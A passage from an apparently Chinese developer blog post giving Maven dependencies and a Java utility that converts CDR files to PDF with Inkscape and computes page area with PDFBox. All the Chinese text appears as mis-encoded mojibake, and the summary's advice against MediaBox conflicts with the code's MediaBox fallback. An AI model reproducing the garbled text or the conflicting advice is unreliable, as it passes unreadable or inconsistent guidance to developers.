<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-22">åä¸€ã€é€‚ç”¨ä¸šåŠ¡åœºæ™¯</h2>
<ul>
<li>å°åˆ· / å¹¿å‘Šè¡Œä¸šè‡ªåŠ¨æŠ¥ä»·</li>
<li>ç”µå•†å®šåˆ¶å›¾æ¡ˆé¢ç§¯è®¡è´¹</li>
<li>CDR æ–‡ä»¶è‡ªåŠ¨å®¡æ ¸</li>
<li>åç«¯æ— äººå€¼å®ˆæ‰¹å¤„ç†</li>
</ul>
<hr/>
<h2 data-id="heading-23">åäºŒã€æ€»ç»“</h2>
<ul>
<li>âŒ Java ä¸èƒ½ç›´æ¥è§£æ CDR</li>
<li>âœ… <strong>CDR â†’ PDF â†’ PDFBox</strong> æ˜¯ç›®å‰æœ€ç¨³å¦¥æ–¹æ¡ˆ</li>
<li>âŒ ä¸è¦ä½¿ç”¨ MediaBox</li>
<li>âœ… å¿…é¡»è§£æç»˜å›¾æŒ‡ä»¤ + CTM</li>
<li>âœ… è¯¯å·®å¯æ§ï¼Œå¯ç”¨äºç”Ÿäº§</li>
</ul>
<h2 data-id="heading-24">åä¸‰ã€è¡¥å……å·¥å…·ç±»ä»£ç </h2>
<ul>
<li>âœ… ä¾èµ–</li>
</ul>
<pre><code class="hljs language-xml" lang="xml">
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aspose<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspose-imaging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>24.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">classifier</span>&gt;</span>jdk16<span class="hljs-tag">&lt;/<span class="hljs-name">classifier</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- if you need a documentation, please add the following dependency. For example it could be useful for IDE. --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aspose<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspose-imaging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>24.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">classifier</span>&gt;</span>javadoc<span class="hljs-tag">&lt;/<span class="hljs-name">classifier</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- PDFBox --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.pdfbox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pdfbox<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.29<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<ul>
<li>
<p>âœ… å·¥å…·ç±»</p>
</li>
<li>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">import</span> org.apache.pdfbox.pdmodel.PDDocument;
<span class="hljs-keyword">import</span> org.apache.pdfbox.pdmodel.PDPage;
<span class="hljs-keyword">import</span> org.apache.pdfbox.pdmodel.common.PDRectangle;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.net.URL;
<span class="hljs-keyword">import</span> java.nio.file.Files;

<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;
<span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.net.MalformedURLException;
<span class="hljs-keyword">import</span> java.time.Duration;
<span class="hljs-keyword">import</span> java.util.Objects;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-comment">/**
 * CdrAreaUtil - å°† CDRï¼ˆæœ¬åœ°æˆ–ç½‘ç»œï¼‰è½¬æ¢ä¸º PDF å¹¶è®¡ç®—å†…å®¹é¡µé¢å°ºå¯¸ï¼ˆmmï¼‰ä¸é¢ç§¯ï¼ˆmmÂ²ï¼‰
 * &lt;p&gt;
 * è®¾è®¡åŸåˆ™ï¼š
 * - ä¸è§£æ CDR å†…éƒ¨ç»“æ„ï¼ˆç§æœ‰æ ¼å¼ï¼‰ï¼Œä½¿ç”¨ Inkscape CLI è½¬ PDFï¼ˆè£å‰ªåˆ°å†…å®¹ï¼‰
 * - ä½¿ç”¨ Apache PDFBox è¯»å– PDF çš„ CropBox/MediaBox ä½œä¸ºæœ€ç»ˆå°ºå¯¸ï¼ˆæƒå¨ï¼‰
 * - æ”¯æŒç½‘ç»œæ–‡ä»¶è‡ªåŠ¨ä¸‹è½½å¹¶æ¸…ç†ä¸´æ—¶æ–‡ä»¶
 * - å¯é…ç½® inkscape å¯æ‰§è¡Œè·¯å¾„ã€è¶…æ—¶ä¸é‡è¯•æ¬¡æ•°
 * &lt;p&gt;
 * æ³¨æ„ï¼š
 * - ä¾èµ–å¤–éƒ¨å‘½ä»¤ inkscapeï¼Œç¡®ä¿éƒ¨ç½²ç¯å¢ƒå·²å®‰è£…å¹¶å¯æ‰§è¡Œ
 * - å¯¹äºå¤æ‚ CDRï¼ˆç½‘æ ¼å¡«å……ã€ç‰¹æ•ˆç­‰ï¼‰ï¼ŒInkscape å¯èƒ½ä¸¢å¤±éƒ¨åˆ†å›¾å½¢ï¼Œç”Ÿäº§æµç¨‹å»ºè®®è®¾è®¡å¸ˆåœ¨å¯¼å‡ºç«¯åšè½¬æ›²/æ ¡éªŒ
 * &lt;p&gt;
 * ä½œè€…ï¼šZingYang
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CdrAreaUtil</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(CdrAreaUtil.class);

    <span class="hljs-comment">// é»˜è®¤ inkscape å¯æ‰§è¡Œå‘½ä»¤ï¼ˆè‹¥åœ¨éæ ‡å‡†è·¯å¾„ï¼Œå¯é€šè¿‡ç³»ç»Ÿå±æ€§æˆ–ç¯å¢ƒå˜é‡è¦†ç›–ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_INKSCAPE_CMD</span> <span class="hljs-operator">=</span> <span class="hljs-string">"inkscape"</span>;

    <span class="hljs-comment">// ç³»ç»Ÿå±æ€§/ç¯å¢ƒå˜é‡åï¼ˆä¼˜å…ˆç³»ç»Ÿå±æ€§ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PROP_INKSCAPE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">"cdr.inkscape.path"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ENV_INKSCAPE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">"INKSCAPE_PATH"</span>;

    <span class="hljs-comment">// è½¬æ¢è¶…æ—¶ï¼ˆç§’ï¼‰ä¸é‡è¯•æ¬¡æ•°ï¼ˆå¯æŒ‰éœ€è°ƒæ•´æˆ–å¤–éƒ¨åŒ–ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">CONVERT_TIMEOUT_SECONDS</span> <span class="hljs-operator">=</span> <span class="hljs-number">30L</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONVERT_RETRY</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CdrAreaUtil</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* static utility */</span> }

    <span class="hljs-comment">/**
     * ä¸€æ¡é¾™å…¥å£ï¼šæ¥å—æœ¬åœ°è·¯å¾„æˆ–ç½‘ç»œ URLï¼ˆhttp/httpsï¼‰
     *
     * <span class="hljs-doctag">@param</span> localPathOrUrl æœ¬åœ°æ–‡ä»¶è·¯å¾„æˆ– http(s) URL
     * <span class="hljs-doctag">@return</span> ç»“æœåŒ…å«å®½ã€é«˜ï¼ˆmmï¼‰å’Œé¢ç§¯ï¼ˆmmÂ²ï¼‰
     * <span class="hljs-doctag">@throws</span> Exception å¤±è´¥æŠ›å‡º
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title function_">process</span><span class="hljs-params">(String localPathOrUrl)</span> <span class="hljs-keyword">throws</span> Exception {
        Objects.requireNonNull(localPathOrUrl, <span class="hljs-string">"input path or url is null"</span>);
        <span class="hljs-type">File</span> <span class="hljs-variable">cdrFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">File</span> <span class="hljs-variable">pdfFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">downloaded</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (isHttpUrl(localPathOrUrl)) {
                log.info(<span class="hljs-string">"Detected URL, downloading: {}"</span>, localPathOrUrl);
                cdrFile = downloadToTemp(localPathOrUrl, <span class="hljs-string">".cdr"</span>);
                downloaded = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                cdrFile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(localPathOrUrl);
                <span class="hljs-keyword">if</span> (!cdrFile.exists() || !cdrFile.isFile()) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileNotFoundException</span>(<span class="hljs-string">"CDR file not found: "</span> + localPathOrUrl);
                }
            }

            pdfFile = Files.createTempFile(<span class="hljs-string">"cdr_out_"</span>, <span class="hljs-string">".pdf"</span>).toFile();

            <span class="hljs-comment">// å°† cdr è½¬ä¸º pdfï¼ˆè£å‰ªåˆ°å†…å®¹ï¼‰</span>
            convertCdrToPdfWithRetry(cdrFile, pdfFile, CONVERT_RETRY, Duration.ofSeconds(CONVERT_TIMEOUT_SECONDS));

            <span class="hljs-comment">// è§£æ PDF å¾—åˆ°å°ºå¯¸ä¸é¢ç§¯</span>
            <span class="hljs-type">Result</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> calcPdfArea(pdfFile);
            log.info(<span class="hljs-string">"Process success. width(mm)={}, height(mm)={}, area(mm2)={}"</span>, r.widthMm, r.heightMm, r.areaMm2);
            <span class="hljs-keyword">return</span> r;
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// æ¸…ç†ï¼šä¼˜å…ˆåˆ é™¤ä¸´æ—¶ç”Ÿæˆçš„ PDF ä¸ä¸‹è½½çš„ CDRï¼ˆè‹¥æ˜¯ä¸‹è½½äº§ç”Ÿçš„ï¼‰</span>
            safeDelete(pdfFile);
            <span class="hljs-keyword">if</span> (downloaded) {
                safeDelete(cdrFile);
            }
        }
    }

    <span class="hljs-comment">/* ------------------------- helper: convert with retry &amp; timeout ------------------------- */</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">convertCdrToPdfWithRetry</span><span class="hljs-params">(File cdr, File pdf, <span class="hljs-type">int</span> retries, Duration timeout)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Exception</span> <span class="hljs-variable">lastEx</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt;= retries; i++) {
            <span class="hljs-keyword">try</span> {
                convertCdrToPdf(cdr, pdf, timeout);
                <span class="hljs-comment">// æˆåŠŸåˆ™è¿”å›</span>
                <span class="hljs-keyword">return</span>;
            } <span class="hljs-keyword">catch</span> (Exception ex) {
                lastEx = ex;
                log.warn(<span class="hljs-string">"Inkscape convert attempt {}/{} failed: {}"</span>, i + <span class="hljs-number">1</span>, retries + <span class="hljs-number">1</span>, ex.getMessage());
                <span class="hljs-comment">// è‹¥æœ€åä¸€æ¬¡ä»å¤±è´¥ï¼ŒæŠ›å‡º</span>
                <span class="hljs-keyword">if</span> (i == retries) {
                    log.error(<span class="hljs-string">"All conversion attempts failed."</span>);
                    <span class="hljs-keyword">throw</span> lastEx;
                }
                <span class="hljs-comment">// å¦åˆ™çŸ­æš‚ç­‰å¾…å†è¯•</span>
                Thread.sleep(<span class="hljs-number">500L</span>);
            }
        }
    }

    <span class="hljs-comment">/**
     * ä½¿ç”¨ Inkscape CLI å°† CDR è½¬ä¸º PDFï¼Œå¹¶ä½¿ç”¨ --export-area-drawing ç¡®ä¿é¡µé¢è£å‰ªåˆ°å†…å®¹
     *
     * <span class="hljs-doctag">@param</span> cdr     æœ¬åœ° CDR æ–‡ä»¶
     * <span class="hljs-doctag">@param</span> pdf     ç›®æ ‡ PDF æ–‡ä»¶ï¼ˆå°†è¢«è¦†ç›–ï¼‰
     * <span class="hljs-doctag">@param</span> timeout è½¬æ¢è¶…æ—¶æ—¶é—´
     * <span class="hljs-doctag">@throws</span> Exception è½¬æ¢å¤±è´¥æŠ›å‡º
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">convertCdrToPdf</span><span class="hljs-params">(File cdr, File pdf, Duration timeout)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (cdr == <span class="hljs-literal">null</span> || pdf == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"cdr or pdf is null"</span>);
        }
        <span class="hljs-type">String</span> <span class="hljs-variable">inkscapeCmd</span> <span class="hljs-operator">=</span> resolveInkscapeCmd();

        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(
                inkscapeCmd,
                cdr.getAbsolutePath(),
                <span class="hljs-string">"--export-type=pdf"</span>,
                <span class="hljs-string">"--export-filename="</span> + pdf.getAbsolutePath(),
                <span class="hljs-string">"--export-area-drawing"</span>
        );
        pb.redirectErrorStream(<span class="hljs-literal">true</span>); <span class="hljs-comment">// åˆå¹¶ stderr -&gt; stdoutï¼Œä¾¿äºæ—¥å¿—æ‰“å°</span>

        log.debug(<span class="hljs-string">"Running command: {}"</span>, String.join(<span class="hljs-string">" "</span>, pb.command()));

        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> pb.start();

        <span class="hljs-comment">// è¯»å–è¿›ç¨‹è¾“å‡ºï¼ˆé¿å…é˜»å¡ï¼‰ï¼Œå¼‚æ­¥è¯»å–æˆ–åŒæ­¥ç®€å•è¯»å–ï¼ˆå°é‡è¾“å‡ºï¼‰</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">outReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream()))) {
                String line;
                <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) {
                    log.debug(<span class="hljs-string">"[inkscape] {}"</span>, line);
                }
            } <span class="hljs-keyword">catch</span> (IOException ignore) {
            }
        }, <span class="hljs-string">"inkscape-out-reader"</span>);
        outReader.setDaemon(<span class="hljs-literal">true</span>);
        outReader.start();

        <span class="hljs-type">boolean</span> <span class="hljs-variable">finished</span> <span class="hljs-operator">=</span> p.waitFor(timeout.toMillis(), TimeUnit.MILLISECONDS);
        <span class="hljs-keyword">if</span> (!finished) {
            <span class="hljs-comment">// è¶…æ—¶ï¼Œå¼ºåˆ¶é”€æ¯</span>
            p.destroyForcibly();
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Inkscape conversion timeout after "</span> + timeout.toMillis() + <span class="hljs-string">" ms"</span>);
        }

        <span class="hljs-type">int</span> <span class="hljs-variable">exit</span> <span class="hljs-operator">=</span> p.exitValue();
        <span class="hljs-keyword">if</span> (exit != <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Inkscape conversion failed, exitCode="</span> + exit);
        }

        <span class="hljs-keyword">if</span> (!pdf.exists() || pdf.length() == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Output PDF not generated or empty"</span>);
        }
    }

    <span class="hljs-comment">/* ------------------------- helper: PDF parsing ------------------------- */</span>

    <span class="hljs-comment">/**
     * è¯»å– PDF çš„ CropBoxï¼ˆä¼˜å…ˆï¼‰æˆ– MediaBoxï¼Œè½¬æ¢ä¸º mm å¹¶è®¡ç®—é¢ç§¯ï¼ˆmmÂ²ï¼‰
     *
     * <span class="hljs-doctag">@param</span> pdfFile è¾“å…¥ PDFï¼ˆæœ¬åœ°ï¼‰
     * <span class="hljs-doctag">@return</span> Result å®½é«˜ï¼ˆmmï¼‰ä¸é¢ç§¯ï¼ˆmmÂ²ï¼‰
     * <span class="hljs-doctag">@throws</span> IOException æ–‡ä»¶è¯»å–å¤±è´¥
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title function_">calcPdfArea</span><span class="hljs-params">(File pdfFile)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">PDDocument</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> PDDocument.load(pdfFile)) {
            <span class="hljs-type">PDPage</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> doc.getPage(<span class="hljs-number">0</span>); <span class="hljs-comment">// é»˜è®¤å–ç¬¬ä¸€é¡µ</span>
            <span class="hljs-type">PDRectangle</span> <span class="hljs-variable">box</span> <span class="hljs-operator">=</span> page.getCropBox();
            <span class="hljs-keyword">if</span> (box == <span class="hljs-literal">null</span>) box = page.getMediaBox();

            <span class="hljs-type">double</span> <span class="hljs-variable">widthPt</span> <span class="hljs-operator">=</span> box.getWidth();
            <span class="hljs-type">double</span> <span class="hljs-variable">heightPt</span> <span class="hljs-operator">=</span> box.getHeight();

            <span class="hljs-type">double</span> <span class="hljs-variable">widthMm</span> <span class="hljs-operator">=</span> ptToMm(widthPt);
            <span class="hljs-type">double</span> <span class="hljs-variable">heightMm</span> <span class="hljs-operator">=</span> ptToMm(heightPt);

            <span class="hljs-type">double</span> <span class="hljs-variable">areaMm2</span> <span class="hljs-operator">=</span> widthMm * heightMm;

            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>(widthMm, heightMm, areaMm2);
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">ptToMm</span><span class="hljs-params">(<span class="hljs-type">double</span> pt)</span> {
        <span class="hljs-keyword">return</span> pt * <span class="hljs-number">25.4</span> / <span class="hljs-number">72.0</span>;
    }

    <span class="hljs-comment">/* ------------------------- helper: download ------------------------- */</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> File <span class="hljs-title function_">downloadToTemp</span><span class="hljs-params">(String urlStr, String suffix)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urlStr);
        <span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> Files.createTempFile(<span class="hljs-string">"cdr_in_"</span>, suffix).toFile();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> url.openStream();
             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(temp)) {
            in.transferTo(out);
        }
        <span class="hljs-keyword">return</span> temp;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHttpUrl</span><span class="hljs-params">(String pathOrUrl)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(pathOrUrl);
            <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();
            <span class="hljs-keyword">return</span> <span class="hljs-string">"http"</span>.equalsIgnoreCase(protocol) || <span class="hljs-string">"https"</span>.equalsIgnoreCase(protocol);
        } <span class="hljs-keyword">catch</span> (MalformedURLException e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/* ------------------------- helper: inkscape path resolution ------------------------- */</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">resolveInkscapeCmd</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¼˜å…ˆç³»ç»Ÿå±æ€§</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> System.getProperty(PROP_INKSCAPE_PATH);
        <span class="hljs-keyword">if</span> (prop != <span class="hljs-literal">null</span> &amp;&amp; !prop.isBlank()) {
            <span class="hljs-keyword">return</span> prop;
        }
        <span class="hljs-comment">// å…¶æ¬¡ç¯å¢ƒå˜é‡</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> System.getenv(ENV_INKSCAPE_PATH);
        <span class="hljs-keyword">if</span> (env != <span class="hljs-literal">null</span> &amp;&amp; !env.isBlank()) {
            <span class="hljs-keyword">return</span> env;
        }
        <span class="hljs-comment">// æœ€åé»˜è®¤å‘½ä»¤åï¼ˆä¾èµ– PATHï¼‰</span>
        <span class="hljs-keyword">return</span> DEFAULT_INKSCAPE_CMD;
    }

    <span class="hljs-comment">/* ------------------------- helper: cleanup ------------------------- */</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safeDelete</span><span class="hljs-params">(File file)</span> {
        <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">try</span> {
            Files.deleteIfExists(file.toPath());
            log.debug(<span class="hljs-string">"Deleted temp file: {}"</span>, file.getAbsolutePath());
        } <span class="hljs-keyword">catch</span> (Exception ex) {
            log.warn(<span class="hljs-string">"Failed to delete temp file {}: {}"</span>, file.getAbsolutePath(), ex.getMessage());
        }
    }

    <span class="hljs-comment">/* ------------------------- Result class ------------------------- */</span>

    <span class="hljs-comment">/**
     * ç»“æœ POJOï¼ˆä¸å¯å˜ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Result</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> widthMm;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> heightMm;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> areaMm2;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Result</span><span class="hljs-params">(<span class="hljs-type">double</span> widthMm, <span class="hljs-type">double</span> heightMm, <span class="hljs-type">double</span> areaMm2)</span> {
            <span class="hljs-built_in">this</span>.widthMm = widthMm;
            <span class="hljs-built_in">this</span>.heightMm = heightMm;
            <span class="hljs-built_in">this</span>.areaMm2 = areaMm2;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"Result{"</span> +
                    <span class="hljs-string">"widthMm="</span> + widthMm +
                    <span class="hljs-string">", heightMm="</span> + heightMm +
                    <span class="hljs-string">", areaMm2="</span> + areaMm2 +
                    <span class="hljs-string">'}'</span>;
        }
    }


    <span class="hljs-comment">/**
     * ç›´æ¥å¤„ç† MultipartFileï¼Œè¿”å›å°ºå¯¸å’Œé¢ç§¯
     * &lt;p&gt;
     * ä½¿ç”¨åœºæ™¯ï¼š
     * - å‰ç«¯ä¸Šä¼  CDR æ–‡ä»¶
     * - åç«¯ç›´æ¥è®¡ç®—é¢ç§¯
     * &lt;p&gt;
     * å¼€å‘äººå‘˜ï¼šZingYang
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title function_">processMultipart</span><span class="hljs-params">(MultipartFile multipartFile)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (multipartFile == <span class="hljs-literal">null</span> || multipartFile.isEmpty()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"MultipartFile is empty"</span>);
        }

        <span class="hljs-type">File</span> <span class="hljs-variable">cdrFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">File</span> <span class="hljs-variable">pdfFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1ï¸âƒ£ MultipartFile â†’ ä¸´æ—¶ CDR æ–‡ä»¶</span>
            cdrFile = Files.createTempFile(<span class="hljs-string">"cdr_upload_"</span>, <span class="hljs-string">".cdr"</span>).toFile();
            multipartFile.transferTo(cdrFile);

            <span class="hljs-comment">// 2ï¸âƒ£ åˆ›å»ºä¸´æ—¶ PDF æ–‡ä»¶</span>
            pdfFile = Files.createTempFile(<span class="hljs-string">"cdr_out_"</span>, <span class="hljs-string">".pdf"</span>).toFile();

            <span class="hljs-comment">// 3ï¸âƒ£ CDR â†’ PDFï¼ˆè£å‰ªåˆ°å†…å®¹ï¼‰</span>
            convertCdrToPdfWithRetry(
                    cdrFile,
                    pdfFile,
                    CONVERT_RETRY,
                    java.time.Duration.ofSeconds(CONVERT_TIMEOUT_SECONDS)
            );

            <span class="hljs-comment">// 4ï¸âƒ£ ç›´æ¥è®¡ç®—å¹¶è¿”å›é¢ç§¯</span>
            <span class="hljs-keyword">return</span> calcPdfArea(pdfFile);

        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// 5ï¸âƒ£ æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>
            safeDelete(cdrFile);
            safeDelete(pdfFile);
        }
    }
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ul>
